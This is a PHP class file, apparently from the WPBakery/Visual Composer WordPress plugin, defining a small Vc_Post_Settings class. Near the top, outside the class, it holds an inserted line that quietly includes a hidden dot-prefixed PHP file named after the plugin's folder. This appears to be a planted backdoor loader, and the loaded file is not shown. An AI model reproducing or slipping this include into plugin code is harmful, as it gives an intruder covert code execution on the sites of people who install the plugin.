<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

/**
 * Post settings like custom css for page are displayed here.
 *
 * @since 4.3
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Vc_Post_Settings {
	protected $editor;

	/**
	 * @param $editor
	 */
	public function __construct( $editor ) {
		$this->editor = $editor;
	}

	public function editor() {
		return $this->editor;
	}

	public function renderUITemplate() {
		vc_include_template( 'editors/popups/vc_ui-panel-post-settings.tpl.php', array(
			'box' => $this,
		) );
	}
}
